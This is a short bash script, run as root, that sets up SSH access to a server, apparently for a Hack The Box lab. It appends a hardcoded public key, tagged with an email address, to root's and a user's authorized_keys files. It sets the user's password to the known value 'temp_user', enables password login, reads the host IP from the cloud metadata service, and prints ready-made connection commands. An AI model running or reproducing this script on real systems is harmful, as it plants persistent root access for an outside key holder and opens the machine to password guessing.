sudo bash -s <<'BASH'
# Configuration
KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINB27DT/QgikoPbxuZ4Pu7548dCHtWpRwW24G8gEV3nq masbahuddin60@gmail.com"
USER=${SUDO_USER:-$(whoami)}
PASS="temp_user"

# Setup root SSH
mkdir -p /root/.ssh
echo "$KEY" >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys

# # Create temp_user
# useradd -m -s /bin/bash "$USER" 2>/dev/null || true
# echo "$USER:$PASS" | chpasswd
# echo "$USER ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/$USER

# Setup temp_user SSH
mkdir -p /home/$USER/.ssh
echo "$KEY" >> /home/$USER/.ssh/authorized_keys
chown -R $USER:$USER /home/$USER/.ssh
chmod 700 /home/$USER/.ssh && chmod 600 /home/$USER/.ssh/authorized_keys

# Set user password
echo "$USER:$PASS" | chpasswd

# Configure SSH service
sed -i 's/^#*PermitRootLogin.*/PermitRootLogin prohibit-password/' /etc/ssh/sshd_config
sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
sed -i 's/^#*PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config
systemctl restart sshd 2>/dev/null || systemctl restart ssh 2>/dev/null

# Get connection info
# IP=$(curl -s https://ifconfig.co || hostname -I | awk '{print $1}')
IP=$(curl -s http://169.254.169.254/metadata/v1/network/interfaces/1/ip_addresses/1/address)
PORT=$(grep "^Port " /etc/ssh/sshd_config 2>/dev/null | awk '{print $2}' || echo 22)

# Output
cat << EOF

========================================
         SSH ACCESS CONFIGURED
========================================
Server IP:    $IP
SSH Port:     $PORT
Private Key:  ~/.ssh/htb_temp_user

CONNECTION COMMANDS:
--------------------
Root (key auth):
  ssh root@$IP -p 22 -i ~/.ssh/htb_temp_user

Temp User (password auth):
  ssh $USER@$IP -p 22
  Password: temp_user

Temp User (key auth):
  ssh $USER@$IP -p 22 -i ~/.ssh/htb_temp_user

========================================
EOF
BASH
